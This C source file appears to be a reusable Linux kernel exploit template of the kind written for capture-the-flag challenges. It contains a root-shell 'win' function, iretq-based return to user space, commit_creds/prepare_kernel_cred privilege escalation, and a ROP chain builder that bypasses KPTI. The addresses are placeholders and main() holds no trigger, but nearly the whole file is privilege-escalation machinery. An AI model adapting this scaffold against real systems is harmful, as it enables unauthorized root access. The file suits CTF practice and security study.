#include <fcntl.h>
#include <linux/prctl.h>  // remove if unnecessary (musl doesn't have this)
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <unistd.h>

uint64_t user_cs, user_ss, user_rsp, user_rflags;

static void fatal(const char *str) {
    perror(str);
    exit(1);
}

static void dump_buffer(void *buffer, uint64_t row) {
    uint64_t *ptr = buffer;
    printf("[ ] buffer dump from %p\n", ptr);
    for (uint64_t i = 0; i < row; i++) {
        printf("[ ]   %p|+0x%02lx: 0x%016lx\n", &ptr[i], i * 8, ptr[i]);
    }
}

static void win(void) {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

static void save_state(void) {
    asm("movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

static void restore_state(void) {
    asm volatile(
        "swapgs ;"
        "movq %0, 0x20(%%rsp)\t\n"
        "movq %1, 0x18(%%rsp)\t\n"
        "movq %2, 0x10(%%rsp)\t\n"
        "movq %3, 0x08(%%rsp)\t\n"
        "movq %4, 0x00(%%rsp)\t\n"
        "iretq"
        :
        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs), "r"(win));
}

// addresses
#define default_kbase (0xffffffff81000000)
#define addr_prepare_kernel_cred (0xdddddddddddddddd - default_kbase + kbase)
#define addr_commit_creds (0xdddddddddddddddd - default_kbase + kbase)
#define addr_init_cred (0xdddddddddddddddd - default_kbase + kbase)
#define addr_modprobe_path (0xdddddddddddddddd - default_kbase + kbase)

// gadgets
#define pop_rdi_ret (0xdddddddddddddddd - default_kbase + kbase)
#define pop_rcx_ret (0xdddddddddddddddd - default_kbase + kbase)
#define mov_rdi_rax_rep_ret (0xdddddddddddddddd - default_kbase + kbase)
#define bypass_kpti (0xdddddddddddddddd - default_kbase + kbase)

// global variables
uint64_t kbase = default_kbase;
bool kaslr = true;

char buf[0x500];
char tmp[0x500];
int32_t spray[100];
int32_t fd;

static bool valid_kbase(void) {
    if (!kaslr && kbase == default_kbase) {
        return true;
    }
    if (kaslr && ((kbase >> 32) == 0xffffffff && (kbase & 0xfffff) == 0 && default_kbase <= kbase &&
                  kbase <= 0xffffffffc0000000)) {
        return true;
    }
    return false;
}

static void escalate_privilege(void) {
    char *(*pkc)(int) = (void *)(addr_prepare_kernel_cred);
    void (*cc)(char *) = (void *)(addr_commit_creds);
    (*cc)((*pkc)(0));
    restore_state();
}

static void krop(uint64_t *ptr) {
    *ptr++ = pop_rdi_ret;
    *ptr++ = 0;
    *ptr++ = addr_prepare_kernel_cred;
    *ptr++ = pop_rcx_ret;
    *ptr++ = 0;
    *ptr++ = mov_rdi_rax_rep_ret;
    *ptr++ = addr_commit_creds;
    *ptr++ = bypass_kpti;
    *ptr++ = 0xdeadbeef;
    *ptr++ = 0xcafebabe;
    *ptr++ = (uint64_t)&win;
    *ptr++ = user_cs;
    *ptr++ = user_rflags;
    *ptr++ = user_rsp;
    *ptr++ = user_ss;
}

int main(void) {
    save_state();

    puts("[-] exploit failed...");
    return 0;
}
